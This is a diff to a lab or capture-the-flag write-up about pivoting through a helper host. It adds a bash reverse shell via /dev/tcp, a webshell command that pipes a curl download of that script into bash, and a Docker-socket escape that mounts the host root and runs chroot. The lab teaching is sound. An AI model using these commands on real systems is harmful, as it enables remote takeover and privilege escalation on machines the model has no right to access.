@@ -211,25 +211,70 @@ To keep this lab simple, we can assume that we have discovered the webshell in `
 root@attacker:/# proxychains -q curl http://172.16.101.11/test.php?cmd=echo+"hellowordl!"
 ```
 
-Exploit this and get the reverse shell directly from `victim` to our `attacker` machine. First, we have to setup a remote forwarding port again and listen for reverse shell connection
+Then we make a reverse shell script in `/tmp/rev.sh`
 ```bash
-ssh -R :80:172.16.100.10:80 -R :1331:172.16.100.10:1331 root@helper -N -f
-proxychains4 -q ./poc.sh 172.16.101.11
-python3 -m http.server 80
-ncat -lvnp 1331
+cat << EOF > /tmp/rev.sh
+sh -i >& /dev/tcp/172.16.101.10/1337 0>&1
+EOF
 ```
 
-Next, we send the revershell payload to `victim`
+Exploit this and get the reverse shell directly from `victim` to our `attacker` machine. First, we have to setup a remote forwarding port again and listen for reverse shell connection. We set 2 tunnel, one on port 80 for host reverse shell script, one on port 1337 for listening reverse connection
 ```bash
-root@attacker:/# proxychains -q curl http://172.16.101.11/test.php?cmd=<<rev_shell_payload>>
+ssh -R :80:172.16.100.10:80 -R :1337:172.16.100.10:1337 root@helper -Nf
+ncat -lvnp 1337
+```
+
+At the second window, move to the `/tmp` directory and host the reverse shell script:
+```bash
+cd /tmp
+
+python3 -m http.server 80
+```
+
+On the third window, we send request with payload to `victim` to force them curl to the script and execute it
+```bash
+proxychains4 -q http://172.16.101.11/test.php?cmd=curl%20-L%20http%3A%2F%2F172.16.101.10%3A80%2Frev.sh%20%7C%20%2Fbin%2Fbash
 ```
 
 Finally, we are into the `victim` machine
+get the `user` flag
+```bash
+cat /user.txt
+```
 
 ### Insecure volumn mounting
-...
+Check for insecure volumn mounting
 ```bash
-./docker -H unix:///var/run/docker.sock ps
+root@victim:/# ls /var/run/docker.sock
+/var/run/docker.sock
+...
+
+Test for insecure volumn mouting vulnerability
+```bash
+root@victim:/# docker -H unix:///var/run/docker.sock ps
+...
+```
+
+Pull a image to host
+```bash
+docker -H unix:///var/run/docker.sock pull alpine
+```
+
+Run the container and mount host root directory into our `/mnt`
+```bash
+docker -H unix:///var/run/docker.sock run \
+  -v /:/mnt \
+  --rm -it alpine sh
+```
+
+Change root to `/mnt`
+```bash
+chroot /mnt sh
+```
+
+Get the `root` flag
+```bash
+cat root.txt
 ```
 
 
